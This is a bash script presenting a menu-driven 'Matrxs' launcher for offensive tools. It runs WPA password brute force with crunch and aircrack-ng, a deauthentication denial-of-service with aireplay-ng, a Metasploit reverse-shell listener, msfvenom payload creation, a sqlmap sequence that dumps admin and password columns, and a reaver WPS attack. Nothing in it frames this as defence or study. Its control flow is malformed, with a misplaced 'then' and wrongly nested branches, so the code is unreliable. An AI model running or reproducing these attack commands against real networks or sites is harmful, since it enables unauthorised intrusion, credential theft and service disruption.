figlet Matrxs
sleep 1
echo "Weelcome to Matrxs Here"
sleep 1
echo "1:Ta5men"
echo "2:Dos.Attack"
echo "3:Muti.Handler"
echo "4:Nmap"
echo "5:Sqlmap"
echo "6:Paylowd"
echo "7:HandCHake"
echo "8:WiFi-wps"
echo "9:Crunch"
echo "10:aircrack"
sleep 1
read -p "enter password type...# " T
if [ $T -eq 1 ] 
then 
figlet Ta5men
echo "1:numbers"
echo "2:Letters"
read -p "enter password type...# " typ
read -p "enter packege file...# " pack
read -p "enter bssid...# " bssid
sleep 1
if [ $typ -eq 1 ]
then
crunch 8 8 1234567890 | aircrack-ng -b $bssid $pack -w-
elif [ $typ -eq 2 ]
crunch 8 8 abcdefghijklmnopqrstuvwxyz | aircrack-ng -b $bssid $pack -w-
then
echo "pleez enter password type ...."
fi
echo "Done...."
if [ $T -eq 2 ]
then
sleep 1
figlet Dos_Attack 
echo "wellcome to my new tools...."
read -p "enter bssid :# " bssid
read -p "enter intr name :# " intr
read -p "enter number of packrt :# " pack
read -p "enter number of channel :# " chan
sleep 1
iwconfig $intr channel $chan
sleep 1
xterm -e "aireplay-ng -a $bssid --deauth $pack $intr"
echo "thanks for try my tools ..... "
fi
elif [ $T -eq 3 ]
then
figlet Muti.Handler
sleep 1
echo "pleez wait seconds..."
sleep 1
read -p "enter LHOST....: " lhost 
read -p "enter LPORT....: " lport
xterm -e "msfconsole -q -x 'use exploit/multi/handler' -x 'set LHOST $lhost' -x 'set LPORT $lport' -x 'run'"
echo "Thanks for try my tools"
fi
if [ $T -eq 4 ]
then
figlet Nmap
sleep 1
read -p "enter the IP Here...# " N
nmap $N > nmap.txt
xterm -e "tail -F nmap.txt"
echo "Thanks for try my tools"
fi
if [ $T -eq 5 ]
then
figlet Sqlmap
sleep 1
read -p "pleaz enter The Web Here...# " SQL 
sqlmap -u $SQL --dbs
read -p "Enter The Date Here..# " dbs
sqlmap -u $SQL -C $dbs --tables
read -p "Enter The Tables Here..# " tab
sqlmap -u $SQL -D $dbs -T $tab  --columns
read -p "Enter The columns (admin,pass) " usr
sqlmap -u $SQL -D $dbs -T $tab -C $usr --dump
echo "Thanks for try my tools"
fi
if [ $T -eq 6 ]
then
figlet Paylowd
sleep 1
read -p "enter type payload ....:# " pay
read -p "enter LHOST ...>>:# " lhost
read -p "enter LPORT ...>>:# " lport
read -p "enter out file...>>:# " out
xterm -e "msfvenom -p $pay LHOST=$lhost LPORT=$lport  -o $out"
fi
if [ $T -eq 7 ]
then
figlet HandChake
sleep 1
read -p "enter bssid..# " bssid
read -p "enter Channel..# " channel
read -p "enter intr face Here..# " intr
read -p "enter name Handchake..# " name
iwconfig $intr channel $channel 
xterm -e " airodump-ng --bssid $bssid -c $channel -w $name $intr" | xterm -e "aireplay-ng -0 0 -a $bssid $intr"
fi
if [ $T -eq 8 ]
then
figlet Wps Matrxs
read -p "enter bssid..# " bssid
read -p "enter intr..# " intr
iwconfig $intr 
xterm -e "reaver -i $intr -b $bssid -vv"
fi
if [ $T -eq 9 ]
then
figlet Crunch Matrxs
read -p "enter one Number..# " one
read -p "enter Tow Number..# " Tow
read -p "enter Number you need in Wordlesst..# " ok
read -p "enter pwd and name file..# " name
xterm -e "crunch $one $Tow $ok -o $name"
fi
if [ $T -eq 10 ]
then
figlet Aircrack
sleep 1
read -p "Enter The Wordlist Here..# " air
read -p "Enter The Handchek Here..# " H
xterm -e "aircrack $air -w $H"
echo "The End..#"
fi
